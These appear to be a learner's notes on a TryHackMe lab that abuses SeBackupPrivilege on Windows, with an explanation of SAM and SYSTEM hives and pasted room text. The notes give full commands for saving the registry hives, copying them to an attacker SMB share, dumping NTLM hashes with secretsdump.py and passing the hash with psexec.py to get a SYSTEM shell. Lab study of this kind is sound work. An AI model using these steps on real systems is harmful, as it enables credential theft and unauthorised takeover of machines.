
- So this privilege allows users to read and write to any file in the system.
   download the sam and system hives to a folder.
   
   reg save hklm\system C:\Users\THMBackup\system.hive
   reg save hklm\sam C:\Users\THMBackup\sam.hive
   
   ![[Pasted image 20250830164315.png]]

- Start a smb server on a kali machine to copy those files in attack box
  mkdir share 
  python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
  ![[Pasted image 20250830164422.png]]

- Copy the files to attack box.
  ![[Pasted image 20250830164513.png]]

- Just installing the impackets
  ![[Pasted image 20250830164627.png]]

- Using
  - secretsdump.py (used to extract Windows account hashes and secrets)
  - psexec.py (allows you to execute commands remotely on a Windows)
  python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
  python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.205.18
  ![[Pasted image 20250830164706.png]]

And thats how we get the administrator priv




---
Read More:

### ðŸ”¹ What are SAM & SYSTEM hives?

Windows stores critical data in the **registry**, split into â€œhives.â€

- **SAM hive (`C:\Windows\System32\config\SAM`)**
    
    - Holds user account information, including **password hashes**.
        
    - Problem: these hashes are **encrypted**.
        
- **SYSTEM hive (`C:\Windows\System32\config\SYSTEM`)**
    
    - Contains the **Boot Key** (aka SysKey).
        
    - Windows uses this key to encrypt the SAM hashes.
        

ðŸ‘‰ So, **SAM = locked safe** (hashes inside), and **SYSTEM = key** to open it.  
Thatâ€™s why you need **both files together**.

---

### ðŸ”¹ How `secretsdump.py` uses them

1. You copy out `sam.hive` + `system.hive`.
    
2. `secretsdump.py` loads the **Boot Key** from SYSTEM.
    
3. It uses that key to **decrypt the password hashes** in SAM.
    
4. It prints hashes like:
    

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::`

---

### ðŸ”¹ Why hashes, not plaintext?

Windows never stores plaintext passwords (only hashes).

- That NT hash (`8846f7ea...`) is what Windows compares during login.
    
- If you crack it (e.g., John/Hashcat), you get the plaintext.
    
- Or, you donâ€™t even need to crack â†’ you can use the hash directly (**Pass-the-Hash attack** with `psexec.py` / `wmiexec.py`).
    

---

### ðŸ”¹ Putting it together in your lab

- **SeBackupPrivilege** let you _bypass protection_ and dump SAM + SYSTEM.
    
- You copied them to attacker.
    
- `secretsdump.py` decrypted SAM using SYSTEM.
    
- You got NTLM hashes â†’ then either cracked them with John OR used them directly to authenticate as Administrator.
    

---

âš¡ **So the background is:**

- SAM has hashes (encrypted).
    
- SYSTEM has the key.
    
- Together = you can unlock and dump all user password hashes.


---
read more

---

## SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring anyÂ DACLÂ in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

Log in to the target machine viaÂ RDPÂ using the following credentials:

**User:**Â `THMBackup`

**Password:**Â `CopyMaster555`

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

![Run as admin](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png)  

Once on the command prompt, we can check our privileges with the following command:

Command Prompt

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:

Command Prompt

```shell-session
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine usingÂ SMBÂ or any other available method. ForÂ SMB, we can use impacket'sÂ `smbserver.py`Â to start a simpleÂ SMBÂ server with a network share in the current directory of our AttackBox:

KaliLinux

```shell-session
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

This will create a share namedÂ `public`Â pointing to theÂ `share`Â directory, which requires the username and password of our current windows session. After this, we can use theÂ `copy`Â command in our windows machine to transfer both files to our AttackBox:Â 

Command Prompt

```shell-session
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

And use impacket to retrieve the users' password hashes:

KaliLinux

```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:

KaliLinux

```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```